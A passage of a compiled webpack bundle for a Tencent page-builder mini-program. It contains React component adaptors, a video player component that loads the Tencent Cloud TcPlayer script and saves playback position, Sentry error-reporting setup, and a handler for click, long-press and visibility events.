  });
}
// CONCATENATED MODULE: ./handlers/reactHandlers/adaptor/react/index.jsx
function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }






function ReactAdaptor({
  instance,
  injectProps = {},
  meta,
  global
}) {
  const {
    component,
    data,
    style,
    commonStyle,
    key
  } = instance;
  const View = instance.component.component;
  const hotAreas = component.__implementHotArea ? /*#__PURE__*/react["createElement"](HotAreas, {
    global: global,
    meta: meta,
    instance: instance
  }) : null;

  const emit = (trigger, payload) => Object(customEventTrigger["a" /* emitCustomEvent */])(instance, trigger, global, meta, payload);

  const on = (eventName, callback) => Object(componentEventActionEmitter["a" /* onComponentEventAction */])(instance, eventName, callback);

  if (!View) {
    console.error(`Cannot find component [${component.name}] by id [${component.id}]`);
    return null;
  }

  return /*#__PURE__*/react["createElement"](View, _extends({
    key: key,
    componentKey: key,
    data: data,
    style: style,
    commonStyle: commonStyle,
    global: global,
    meta: meta,
    emit: emit,
    on: on,
    hotAreas: hotAreas,
    componentsMap: componentNodeMap["a" /* componentNodeMap */],
    getComponentByKey: componentNodeMap["c" /* getComponentNode */]
  }, injectProps));
}
// EXTERNAL MODULE: /data/sites/vision.qq.com/workspace/libraries/materials-nolan-test-saas/node_modules/lodash.template/index.js
var lodash_template = __webpack_require__(157);
var lodash_template_default = /*#__PURE__*/__webpack_require__.n(lodash_template);

// CONCATENATED MODULE: ./handlers/reactHandlers/adaptor/jimu/index.jsx
function jimu_defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; }

/* eslint-disable */



class jimu_JimuAdaptor extends react_default.a.PureComponent {
  constructor(_props) {
    super(_props);

    jimu_defineProperty(this, "view", null);

    jimu_defineProperty(this, "template", null);

    jimu_defineProperty(this, "jimuInstance", null);

    jimu_defineProperty(this, "hasInited", false);

    jimu_defineProperty(this, "node", null);

    jimu_defineProperty(this, "setNode", node => {
      this.node = node;

      if (!this.hasInited) {
        this.renderComponent(this.node, this.props.instance);
      }
    });

    jimu_defineProperty(this, "renderComponent", (node, instance) => {
      const {
        key,
        style,
        data,
        commonStyle
      } = instance;
      const props = {
        id: `jimu-adaptor-${key}`,
        ...data,
        it: data,
        style,
        commonStyle
      };
      const externalProps = {
        global: this.props.global,
        meta: this.props.meta,
        style,
        commonStyle,
        componentsMap: componentNodeMap["a" /* componentNodeMap */],
        getComponentByKey: componentNodeMap["c" /* getComponentNode */]
      };
      const updateTemplate = style !== this.props.instance.style || commonStyle !== this.props.instance.commonStyle;

      if (updateTemplate || !this.hasInited) {
        node.innerHTML = this.template(props);
        this.jimuInstance = new this.view.component();
        this.jimuInstance.init(props, externalProps);
        this.hasInited = true;
      } else {
        this.jimuInstance.refreshData(props, externalProps);
      }
    });

    const {
      instance: {
        component: {
          component
        }
      }
    } = _props;
    this.view = component;
    this.template = lodash_template_default()(this.view.template);
    this.jimuInstance = new this.view.component();
  }

  componentWillReceiveProps({
    instance: nextInstance
  }) {
    if (!this.node) {
      return;
    }

    this.renderComponent(this.node, nextInstance);
  }

  render() {
    return /*#__PURE__*/react_default.a.createElement("div", {
      ref: this.setNode
    });
  }

}
// CONCATENATED MODULE: ./handlers/reactHandlers/adaptor/index.jsx



function Adaptor({
  instance,
  injectProps,
  global,
  meta
}) {
  const {
    runtime
  } = instance.component;

  if (!runtime || runtime === 'react') {
    return /*#__PURE__*/react["createElement"](ReactAdaptor, {
      instance: instance,
      injectProps: injectProps,
      global: global,
      meta: meta
    });
  }

  if (runtime === 'jimu') {
    return /*#__PURE__*/react["createElement"](jimu_JimuAdaptor, {
      instance: instance,
      global: global,
      meta: meta
    });
  }

  throw new Error(`Invalid runtime [${runtime}]`);
}

/***/ }),

/***/ 159:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";

// EXTERNAL MODULE: /data/sites/vision.qq.com/workspace/libraries/materials-nolan-test-saas/node_modules/react/index.js
var react = __webpack_require__(2);
var react_default = /*#__PURE__*/__webpack_require__.n(react);

// EXTERNAL MODULE: ./libraries/base/components/Video/view/index.scss
var view = __webpack_require__(345);

// CONCATENATED MODULE: ./libraries/base/components/Video/view/index.js
function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; }

/* eslint-disable no-multi-assign */
 // import Mids from 'assets/mids';
// import utils from '@tencent/imutils';



const PLAY = 1;
const PAUSE = 2;
const WAIT = 3;
let playerjsRetry = false;

const loadJS = api => {
  const s = document.createElement('script');

  s.onerror = () => {
    if (!playerjsRetry) {
      playerjsRetry = true;
      loadJS(`//fudao.qq.com/tx_tls_gate=${api}`);
    }
  };

  s.setAttribute('src', api);
  document.head.appendChild(s);
};

class view_TcVideo extends react["Component"] {
  constructor(props) {
    super(props);

    _defineProperty(this, "initVideo", () => {
      if (!this.videoOption.mp4) {
        return;
      }

      if (!this.tvpLoaded) {
        loadJS(`${window.location.protocol}//imgcache.qq.com/open/qcloud/video/vcplayer/TcPlayer-2.2.1.js`);
        this.tvpLoaded = true;
        setTimeout(this.initVideo, 50);
        return;
      }

      if (typeof window.TcPlayer === 'undefined') {
        if (this.checkNums < 100) {
          setTimeout(this.initVideo, 50);
          this.checkNums++;
        }

        return;
      }

      this.instantiation();

      if (this.state.playState === WAIT) {
        setTimeout(() => {
          this.play();
        }, 50);
      }

      if (!this.hasFixPlayerFlag) {
        this.fixFullScreenBtn();
        this.fixPlayLayer();
        this.hasFixPlayerFlag = true;
      }
    });

    _defineProperty(this, "instantiation", () => {
      const {
        videoOption
      } = this;

      if (!videoOption.mp4) {
        return;
      }

      this.player = new window.TcPlayer(videoOption.containerId, videoOption);

      if (this.player) {
        this.player.volume(1); // 设置最大音量
      }

      const {
        el
      } = this.player;
      this.playerControlPanel = el && el.querySelector('.vcp-controls-panel');
      this.sliderThumb = el && el.querySelector('.vcp-slider-thumb');

      if (el !== null) {
        el.querySelector('.vcp-slider-thumb').innerHTML = '<div class="point"></div>';
      }

      this.videoElement = this.videoContainer && this.videoContainer.querySelector('video');
      this.timeline = el && el.querySelector('.vcp-timeline');
      this.bindEvent();
    });

    _defineProperty(this, "catchError", playStatus => {
      if (playStatus.type === 'error') {
        const errorDetail = playStatus.detail || {};
        const mp4Url = this.videoOption.mp4; // 没有m3u8视频源，尝试使用mp4

        if ((errorDetail.code === 2 || errorDetail.reason === 'MEDIA_ERR_SRC_NOT_SUPPORTED') && mp4Url && /v\.f230\.m3u8$/.test(mp4Url)) {
          // 视频错误需要先摧毁实例，否则渲染旧视频
          if (this.player) {
            this.player.destroy();
          }

          this.setVid({
            src: mp4Url.replace('v.f230.m3u8', 'v.f30.mp4')
          });
          this.hasFixPlayerFlag = false;
          this.initVideo();
        } // if (window.BJ_REPORT) {
        //   errorDetail.videoUrl = mp4Url;
        //   window.BJ_REPORT.info(JSON.stringify(errorDetail));
        //   Mids.report('tc_video');
        // }

      }
    });

    _defineProperty(this, "play", () => {
      /** 打点上报用 */
      this.touchTime = new Date();

      if (window.mqq) {
        window.mqq.invoke('edu', 'setScrollHeight', {
          height: 160
        });
      }

      if (!this.playerControlPanel) {
        this.setState({
          playState: WAIT
        });
        return;
      }

      setTimeout(() => {
        this.playerControlPanel.style.visibility = 'visible';
      }, 1500);

      if (this.player) {
        this.player.play();
      }

      this.setState({
        playState: WAIT
      });
    });

    _defineProperty(this, "pause", () => {
      if (this.player && this.videoElement) {
        if (this.player) {
          this.player.pause();
        }
      }

      if (!this.playerControlPanel) {
        return;
      }

      this.playerControlPanel.classList.remove('hide');
      this.setState({
        playState: PAUSE
      });
    });

    _defineProperty(this, "recT", null);

    const {
      data
    } = props;
    const {
      src,
      autoplay,
      coverpic
    } = data;
    this.videoOption = {
      containerId: this.genContainerId(),
      systemFullscreen: true,
      autoplay,
      coverpic,
      width: '100%',
      height: '100%',
      remember: true,
      preload: 'auto',
      mp4: src,
      listener: playStatus => {
        if (this.videoOption.remember) {
          this.recordKey = `tcVideo_${this.videoOption.mp4}`;
          this.continuePlay(playStatus);
          this.recordTimePoint(playStatus);
        }

        this.onPlay(playStatus);
        this.onEnded(playStatus);
        this.onSeek(playStatus);
        this.onFullScreen(playStatus);
        this.catchError(playStatus);
        this.onLoadedmetadata(playStatus);
      }
    };
    this.instantiation = this.instantiation.bind(this);
    this.state = {
      playState: PAUSE
    };
    this.hasContinuePlayFlag = false;
    this.checkNums = 0;
    this.count = 0;
  }

  componentDidMount() {
    /* 实例化一个tvp */
    const {
      data
    } = this.props;
    const mp4 = data.src;

    if (mp4) {
      this.initVideo();
      document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
          this.pause();
        }
      });

      if (window.mqq) {
        window.mqq.addEventListener('pageHide', () => {
          this.player.pause();
        });
      }
    }
  }

  componentWillReceiveProps(nextProps) {
    const test1 = nextProps === this.props;
    const test2 = nextProps.data === this.props.data;

    if (nextProps.data.src && this.props.data.src !== nextProps.data.src || nextProps.data.coverpic && this.props.data.coverpic !== nextProps.data.coverpic || nextProps.data.autoplay && this.props.data.autoplay !== nextProps.data.autoplay) {
      this.player = null;

      if (this.videoContainer) {
        this.videoContainer.innerHTML = '';
      }

      this.setState({
        playState: PAUSE
      });
      this.setVid(nextProps.data);
      this.initVideo();
    }
  }

  componentWillUnmount() {
    if (this.recT) {
      clearInterval(this.recT);
    }

    this.player = null;
  }

  onSeek(playStatus) {
    if (this.seeking) {
      if (playStatus.type === 'seeking') {
        // hack ios的bug：在指定时间播放时，计时停止但画面和声音还在播放
        this.player.pause();
      } else if (playStatus.type === 'seeked') {
        this.seeking = false;
        this.player.play();
      }
    }
  }

  onPlay(playStatus) {
    if (playStatus.type === 'play' && this.props.setOnVideo) {
      this.props.setOnVideo(true);
    }

    if (playStatus.type === 'play') {
      this.setState({
        playState: PLAY
      });
    }
  }

  onEnded(playStatus) {
    if (playStatus.type === 'ended') {
      this.player.currentTime(0);
      this.sliderThumb.style.left = 0; // fix 腾讯云播放器的bug

      this.player.pause();
    }
  } // android全屏处理：android会调起X5内核的视频全屏


  onFullScreen(playStatus) {
    if (playStatus.type === 'fullscreen' && window.mqq) {
      if (playStatus.detail.isFullscreen === true) {// 全屏
        // window.mqq.invoke('edu', 'setLandscape', { landscape: 1 });
      } else {// window.mqq.invoke('edu', 'setLandscape', { landscape: 0 });
        }
    }
  }
  /**
   * 用来获取视频相关的时长
   * 这里主要是传入一个 loadedmetadataCb 的 props 来处理
   */


  onLoadedmetadata(playStatus) {
    const {
      type
    } = playStatus;

    if (type === 'loadedmetadata') {
      const {
        loadedmetadataCb
      } = this.props;

      if (loadedmetadataCb && typeof loadedmetadataCb === 'function') {
        let duration = this.player.duration();
        let reTryTimes = 0;
        /** 这里是因为有的时候获取的值为0, 所以这里要重试下 */

        while (reTryTimes < 3 && duration === 0) {
          duration = this.player.duration();
          reTryTimes++;
        }

        loadedmetadataCb(duration);
      }
    }
  }

  setVid(data) {
    const {
      src,
      coverpic,
      autoplay
    } = data;
    this.videoOption.mp4 = src;
    this.videoOption.coverpic = coverpic;
    this.videoOption.autoplay = autoplay;
  }

  // 续播
  continuePlay(playStatus) {
    if (!this.hasContinuePlayFlag && playStatus.type === 'loadeddata') {
      const timePoint = localStorage.getItem(this.recordKey, this.player.currentTime());

      if (timePoint) {
        setTimeout(() => {
          this.player.currentTime(parseInt(timePoint, 10));
        }, 1000);
      }

      this.hasContinuePlayFlag = true;
    }
  } // 记录播放时间点，三秒记录一次


  recordTimePoint(playStatus) {
    if (playStatus.type === 'playing') {
      // 查找上一次记录
      if (this.recT) {
        clearInterval(this.recT);
      }

      const {
        props: {
          videoFirstReport
        }
      } = this;
      /** 如果是第一次播放则上报 */

      if (!this.reportFirstPic && videoFirstReport) {
        const playingDate = new Date();
        const timeCoast = playingDate - this.touchTime; // utils.speed.report(
        //   {
        //     [videoFirstReport.point]: timeCoast,
        //   },
        //   {
        //     isdFlags: videoFirstReport.isdFlags,
        //   }
        // );

        this.reportFirstPic = true;
      }

      this.recT = setInterval(() => {
        localStorage.setItem(this.recordKey, this.player.currentTime());
      }, 3000);
    } else if (playStatus.type === 'pause' && this.recT) {
      clearInterval(this.recT);
    }
  }

  bindEvent() {
    if (window.mqq && window.mqq.iOS) {
      // 退出全屏
      this.videoElement.addEventListener('webkitendfullscreen', () => {
        this.exitFullScreen();
      }, false);
      this.videoElement.addEventListener('endfullscreen', () => {
        this.exitFullScreen();
      }, false);
      this.timeline.addEventListener('touchend', () => {
        this.seeking = true;
      });
    }
  } // 修复全屏按钮


  fixFullScreenBtn() {
    const fullScreenBtn = document.createElement('div');
    fullScreenBtn.className = 'fullscreen-toggle';
    fullScreenBtn.innerHTML = '<button type="button" title="切换全屏"><span class="tvp_btn_value">全屏</span></button>';

    if (!this.playerControlPanel) {
      return;
    }

    this.playerControlPanel.appendChild(fullScreenBtn);
    fullScreenBtn.addEventListener('click', () => {
      if (window.mqq && window.mqq.iOS) {
        this.iosFullScreen();
      } else {
        this.player.fullscreen(!this.isFullScreen);
      }

      this.isFullScreen = !this.isFullScreen;
    });
  }

  fixPlayLayer() {
    const playLayer = document.createElement('div');
    playLayer.className = 'vcp-play';
    this.player.el.appendChild(playLayer);
    playLayer.addEventListener('click', () => {
      const controlPanel = this.playerControlPanel;
      const isHideControl = controlPanel.className.indexOf('hide') !== -1;

      if (!controlPanel) {
        return;
      }

      if (isHideControl) {
        controlPanel.className = controlPanel.className.replace('hide', 'show');
      } else {
        controlPanel.className = controlPanel.className.replace('show', 'hide');
      }
    });
  } // 退出全屏时


  exitFullScreen() {
    this.player.fullscreen(false);
    this.isFullScreen = false;

    if (this.videoElement.webkitExitFullScreen) {
      this.videoElement.webkitExitFullScreen();
    }

    if (this.videoElement.exitFullScreen) {
      this.videoElement.exitFullScreen();
    }
  } // ios全屏处理：ios会调起浏览器的全屏


  iosFullScreen() {
    if (this.videoElement.webkitEnterFullscreen) {
      this.videoElement.webkitEnterFullscreen();
    }

    if (this.videoElement.enterFullScreen) {
      this.videoElement.enterFullScreen();
    }
  }

  genContainerId() {
    const {
      componentKey
    } = this.props;
    return `js-tc-video-container-${componentKey}`;
  }

  render() {
    const {
      containerId,
      bg_color: bgColor,
      data,
      style,
      commonStyle
    } = this.props; // let tryListenBlockClass = mp4 ? 'tryListenBlock' : 'tryListenBlock hidden';

    let tryListenBlockClass = 'tryListenBlock';
    let videoClass = 'video';
    const {
      playState
    } = this.state;

    switch (playState) {
      case PAUSE:
      case WAIT:
        videoClass = 'video';
        break;

      case PLAY:
        videoClass = 'video play';
        tryListenBlockClass += ' playing';
        break;

      default:
        break;
    }

    return /*#__PURE__*/react_default.a.createElement("div", {
      className: "coverSection vision-video",
      style: { ...commonStyle,
        ...style
      }
    }, playState === PAUSE && /*#__PURE__*/react_default.a.createElement(react_default.a.Fragment, null, /*#__PURE__*/react_default.a.createElement("div", {
      className: "video-mask-play",
      onClick: this.play
    }, /*#__PURE__*/react_default.a.createElement("div", {
      className: "triangle"
    }))), playState === WAIT && /*#__PURE__*/react_default.a.createElement("div", {
      className: "play-wait"
    }, /*#__PURE__*/react_default.a.createElement("div", {
      className: "play-wait-loading",
      alt: "loading"
    })), /*#__PURE__*/react_default.a.createElement("div", {
      ref: videoContainer => {
        this.videoContainer = videoContainer;
      },
      className: videoClass,
      id: containerId || this.genContainerId()
    }));
  }

}

/* harmony default export */ var Video_view = (view_TcVideo);
// EXTERNAL MODULE: /data/sites/vision.qq.com/workspace/libraries/materials-base/node_modules/@sentry/browser/esm/sdk.js + 33 modules
var sdk = __webpack_require__(356);

// EXTERNAL MODULE: /data/sites/vision.qq.com/workspace/libraries/materials-base/node_modules/@sentry/minimal/esm/index.js
var esm = __webpack_require__(23);

// CONCATENATED MODULE: ./libraries/base/lib/utils/errReport.js



function initSentry() {
  sdk["a" /* init */]({
    dsn: 'https://f1921064e90a42cd90428e2bd660547d@report.url.cn/sentry/2512',
    release: 'f16a6c6c9b6111eaa5b0ec388f70eb79',
    beforeSend: (event, hint) => {
      if (event.extra && event.extra.isBaseLib) {
        return event;
      }

      console.log('not isBaseLib');
      return null;
    }
  });
}

const isMiniprogram = true;

if (!isMiniprogram) {
  initSentry();
}

function reportToSentry(error, context = {}) {
  if (isMiniprogram) {
    //小程序暂不支持 sentry 上报
    return;
  }

  esm["b" /* withScope */](scope => {
    scope.setTags(context.tags);
    scope.setExtras({ ...context.extra,
      isBaseLib: true
    });
    esm["a" /* captureException */](error);
  });
}

function errorReport(error, context = {}) {
  console.log('start error report:', error, context);
  reportToSentry(error, context);
  console.log('error report success');
}

function withErrReport(fn) {
  return async (...argus) => {
    try {
      await fn(...argus);
    } catch (e) {
      const {
        meta
      } = argus[0];
      errorReport(e, {
        extra: {
          meta
        },
        tags: {
          componentName: fn.name || 'unknown'
        }
      });
    }
  };
}

class errReport_ErrorBoundary extends react["Component"] {
  componentDidCatch(error, errorInfo) {
    const {
      props = {},
      type = {}
    } = this.props.children;
    const {
      meta
    } = props;
    errorReport(error, {
      extra: {
        meta
      },
      tags: {
        componentName: type.name || 'unknown'
      }
    });
  }

  render() {
    return this.props.children;
  }

}


// CONCATENATED MODULE: ./libraries/base/components/Video/index.js



/* harmony default export */ var Video = __webpack_exports__["a"] = (props => {
  return /*#__PURE__*/react["createElement"](errReport_ErrorBoundary, null, /*#__PURE__*/react["createElement"](Video_view, props));
});

/***/ }),

/***/ 160:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "a", function() { return ComponentActionHandler; });
/* harmony import */ var ramda__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(349);
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(2);
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(react__WEBPACK_IMPORTED_MODULE_1__);
/* harmony import */ var _shared_componentNodeMap__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(17);
/* harmony import */ var _shared_eventListener__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(114);
/* harmony import */ var _shared_utils_common__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(19);
/* harmony import */ var _shared_utils_events__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(20);
/* harmony import */ var _shared_actionHandler_types__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(7);
/* harmony import */ var _shared_actionHandler_utils__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(60);
/* harmony import */ var _shared_actionParams__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(18);
function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; }










const LONG_PRESS_TIMEOUT = 1000;
const DOUBLE_CLICK_TIMEOUT = 200;
const INTERSECTION_TIMEOUT = 500;
class ComponentActionHandler extends react__WEBPACK_IMPORTED_MODULE_1__["PureComponent"] {
  constructor(props) {
    super(props);

    _defineProperty(this, "intersectionObserver", null);

    _defineProperty(this, "handlerParams", {});

    _defineProperty(this, "handlers", {});

    _defineProperty(this, "containerRef", null);

    _defineProperty(this, "longPressTimer", null);

    _defineProperty(this, "preventClick", false);

    _defineProperty(this, "doubleClickTimer", null);

    _defineProperty(this, "intersectionTimer", null);

    _defineProperty(this, "execActionHooks", actions => {
      actions.forEach(action => {
        if (typeof action.action.action === 'function') {
          return;
        }

        const hooks = action.action.action;

        if (hooks.afterHandlerRender) {
          const params = Object(_shared_actionParams__WEBPACK_IMPORTED_MODULE_8__[/* generateComponentActionParams */ "a"])(action, this.props.instance, this.props.global, this.props.meta);

          try {
            hooks.afterHandlerRender(params);
          } catch (e) {
            console.error('Action "afterHandlerRender" hook throw error: ', e);
          }
        }
      });
    });

    _defineProperty(this, "initIntersectionObserver", () => {
      this.intersectionObserver = new window.IntersectionObserver(entries => {
        entries.forEach(({
          target,
          isIntersecting
        }) => {
          const key = parseInt(target.getAttribute('data-key'), 10);
          _shared_utils_events__WEBPACK_IMPORTED_MODULE_5__[/* events */ "b"].emit(_shared_utils_events__WEBPACK_IMPORTED_MODULE_5__[/* EventEmitTypes */ "a"].COMPONENT_INTERSECTING_CHANGE, isIntersecting, key);
        });
      });
    });

    _defineProperty(this, "observeIntersection", () => this.intersectionObserver.observe(this.containerRef));

    _defineProperty(this, "unobserveIntersection", () => this.intersectionObserver.unobserve(this.containerRef));

    _defineProperty(this, "onComponentIntersectionChange", (isIntersecting, key) => {
      if (key !== this.props.instance.key) {
        return;
      }

      if (this.intersectionTimer) {
        clearTimeout(this.intersectionTimer);
        this.intersectionTimer = null;
      }

      const callback = isIntersecting ? this.onComponentEnterView : this.onComponentLeaveView;
      this.intersectionTimer = window.setTimeout(() => {
        callback();
        clearTimeout(this.intersectionTimer);
        this.intersectionTimer = null;
      }, INTERSECTION_TIMEOUT);
    });

    _defineProperty(this, "onComponentEnterView", () => {
      if (this.handlers.onEnterView) {
        this.handlers.onEnterView(undefined);
      }
    });

    _defineProperty(this, "onComponentLeaveView", () => {
      if (this.handlers.onLeaveView) {
        this.handlers.onLeaveView(undefined);
      }
    });

    _defineProperty(this, "onComponentPress", Object(_shared_utils_common__WEBPACK_IMPORTED_MODULE_4__[/* withPersistReactEvent */ "c"])(e => {
      if (!this.handlers.onLongPress) {
        return;
      }

      this.longPressTimer = window.setTimeout(() => this.handlers.onLongPress(e), LONG_PRESS_TIMEOUT);
    }));

    _defineProperty(this, "onComponentPressRelease", () => {
      if (this.longPressTimer) {
        window.clearTimeout(this.longPressTimer);
      }

      this.longPressTimer = null;
    });

    _defineProperty(this, "onSingleClick", Object(_shared_utils_common__WEBPACK_IMPORTED_MODULE_4__[/* withPersistReactEvent */ "c"])(e => {
      this.doubleClickTimer = window.setTimeout(() => {
        if (!this.preventClick) {
          try {
            this.handlers.onClick(e);
          } catch (e) {
            console.error('Exec onClick action error:', e);
          }
        }
      }, DOUBLE_CLICK_TIMEOUT);
    }));

    _defineProperty(this, "onDoubleClick", Object(_shared_utils_common__WEBPACK_IMPORTED_MODULE_4__[/* withPersistReactEvent */ "c"])(e => {
      if (this.doubleClickTimer) {
        clearTimeout(this.doubleClickTimer);
        this.doubleClickTimer = null;
      }

      this.preventClick = true;

      try {
        this.handlers.onDoubleClick(e);
      } catch (e) {
        console.error('Exec onClick action error:', e);
      }

      setTimeout(() => {
        this.preventClick = false;
      }, DOUBLE_CLICK_TIMEOUT);
    }));

    _defineProperty(this, "emitComponentEvent", (e, type) => {
      const {
        props: {
          instance
        },
        handlerParams: {
          global,
          meta
        }
      } = this;
      return Object(_shared_eventListener__WEBPACK_IMPORTED_MODULE_3__[/* emitComponent */ "a"])(e, type, instance, meta, global);
    });

    _defineProperty(this, "withEmitComponentEvent", (type, handler) => e => {
      if (e) {
        e.persist();
      }

      this.emitComponentEvent(e, type);

      if (handler) {
        return handler(e, this.handlerParams);
      }
    });

    _defineProperty(this, "updateHandlerParams", (meta, global) => {
      this.handlerParams.meta = meta;
      this.handlerParams.global = global;
    });

    _defineProperty(this, "updateHandlersWithParams", actions => {
      const {
        onInit,
        onClick,
        onMouseEnter,
        onMouseLeave,
        onDoubleClick,
        onLongPress,
        onEnterView,
        onLeaveView
      } = Object(_shared_actionHandler_utils__WEBPACK_IMPORTED_MODULE_7__[/* generateHandlers */ "a"])(actions, this.props.instance);
      const {
        withEmitComponentEvent,
        handlers
      } = this;
      handlers.onInit = withEmitComponentEvent(_shared_actionHandler_types__WEBPACK_IMPORTED_MODULE_6__[/* ComponentEventListenerTypes */ "b"].INIT, onInit);
      handlers.onClick = withEmitComponentEvent(_shared_actionHandler_types__WEBPACK_IMPORTED_MODULE_6__[/* ComponentEventListenerTypes */ "b"].CLICK, onClick);
      handlers.onMouseEnter = withEmitComponentEvent(_shared_actionHandler_types__WEBPACK_IMPORTED_MODULE_6__[/* ComponentEventListenerTypes */ "b"].MOUSE_ENTER, onMouseEnter);
      handlers.onMouseLeave = withEmitComponentEvent(_shared_actionHandler_types__WEBPACK_IMPORTED_MODULE_6__[/* ComponentEventListenerTypes */ "b"].MOUSE_LEAVE, onMouseLeave);
      handlers.onDoubleClick = withEmitComponentEvent(_shared_actionHandler_types__WEBPACK_IMPORTED_MODULE_6__[/* ComponentEventListenerTypes */ "b"].DOUBLE_CLICK, onDoubleClick);
      handlers.onLongPress = withEmitComponentEvent(_shared_actionHandler_types__WEBPACK_IMPORTED_MODULE_6__[/* ComponentEventListenerTypes */ "b"].LONG_PRESS, onLongPress);
      handlers.onEnterView = withEmitComponentEvent(_shared_actionHandler_types__WEBPACK_IMPORTED_MODULE_6__[/* ComponentEventListenerTypes */ "b"].ENTER_VIEW, onEnterView);
      handlers.onLeaveView = withEmitComponentEvent(_shared_actionHandler_types__WEBPACK_IMPORTED_MODULE_6__[/* ComponentEventListenerTypes */ "b"].LEAVE_VIEW, onLeaveView);
    });

    _defineProperty(this, "setNode", node => {
      this.containerRef = node;
      Object(_shared_componentNodeMap__WEBPACK_IMPORTED_MODULE_2__[/* setComponentNode */ "d"])(this.props.instance.key, node);
    });

    this.handlerParams = {
      global: props.global,
      meta: props.meta
    };
    this.updateHandlersWithParams(props.instance.actions);
  }

  componentDidMount() {
    if (false) {}

    _shared_utils_events__WEBPACK_IMPORTED_MODULE_5__[/* events */ "b"].on(_shared_utils_events__WEBPACK_IMPORTED_MODULE_5__[/* EventEmitTypes */ "a"].COMPONENT_INTERSECTING_CHANGE, this.onComponentIntersectionChange);

    if (this.handlers.onInit) {
      this.handlers.onInit(undefined);
    }

    this.execActionHooks(this.props.instance.actions);
  }

  componentWillReceiveProps(nextProps) {
    if (nextProps.global !== this.props.global || nextProps.meta !== this.props.meta) {
      this.updateHandlerParams(nextProps.meta, nextProps.global);
    }

    if (nextProps.instance.actions !== this.props.instance.actions) {
      this.updateHandlersWithParams(nextProps.instance.actions);
    }
  }

  componentWillUnmount() {
    if (false) {}

    _shared_utils_events__WEBPACK_IMPORTED_MODULE_5__[/* events */ "b"].cancel(_shared_utils_events__WEBPACK_IMPORTED_MODULE_5__[/* EventEmitTypes */ "a"].COMPONENT_INTERSECTING_CHANGE, this.onComponentIntersectionChange);
    Object(_shared_componentNodeMap__WEBPACK_IMPORTED_MODULE_2__[/* deleteComponentNode */ "b"])(this.props.instance.key);

    if (this.longPressTimer) {
      window.clearTimeout(this.longPressTimer);
    }
  }

  render() {
    const {
      children,
      ...rest
    } = this.props;
    delete rest.instance;
    delete rest.meta;
    delete rest.global;
    const {
      onMouseLeave,
      onMouseEnter
    } = this.handlers;
    const elementType =  true ? 'wx-button' : undefined; // wx-button 视为 Web Components, 故使用 class, 见 https://reactjs.org/docs/dom-elements.html#classname

    const classKey =  true ? 'class' : undefined;
    return /*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_1__["createElement"](elementType, {
      [classKey]: '__impage-component-actions-proxy',
      id: Object(_shared_utils_common__WEBPACK_IMPORTED_MODULE_4__[/* getComponentId */ "a"])(this.props.instance.key),
      style: this.props.instance.wrapperStyle,
      ref: this.setNode,
      'data-key': this.props.instance.key,
      onClick: this.onSingleClick,
      onDoubleClick: this.onDoubleClick,
      onMouseEnter,
      onMouseLeave,
      onTouchStart: this.onComponentPress,
      onTouchEnd: this.onComponentPressRelease,
      onMouseDown: this.onComponentPress,
      onMouseUp: this.onComponentPressRelease
    }, ramda__WEBPACK_IMPORTED_MODULE_0__[/* default */ "a"](rest) ? children : react__WEBPACK_IMPORTED_MODULE_1__["Children"].map(children, child => /*#__PURE__*/react__WEBPACK_IMPORTED_MODULE_1__["cloneElement"](child, rest)));
  }

}

/***/ }),

/***/ 162:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return createApp; });
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(2);
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(react__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var react_dom__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(150);
/* harmony import */ var react_dom__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(react_dom__WEBPACK_IMPORTED_MODULE_1__);
/* harmony import */ var _src_app__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(151);
/* harmony import */ var _assets_style_reset_css__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(167);
/* harmony import */ var _assets_style_reset_css__WEBPACK_IMPORTED_MODULE_3___default = /*#__PURE__*/__webpack_require__.n(_assets_style_reset_css__WEBPACK_IMPORTED_MODULE_3__);
/* harmony import */ var _assets_style_vision_mp_css__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(168);
/* harmony import */ var _assets_style_vision_mp_css__WEBPACK_IMPORTED_MODULE_4___default = /*#__PURE__*/__webpack_require__.n(_assets_style_vision_mp_css__WEBPACK_IMPORTED_MODULE_4__);
/**
 * Created By Vision CLI
 *
 * API 参考：
 * http://vision.oa.com/docs/dev-container/#
 */

 // ⚠️ 请勿修改，引入自动生成的 App




function createApp() {
  const container = document.createElement('div');
  container.id = 'app';
  document.body.appendChild(container);
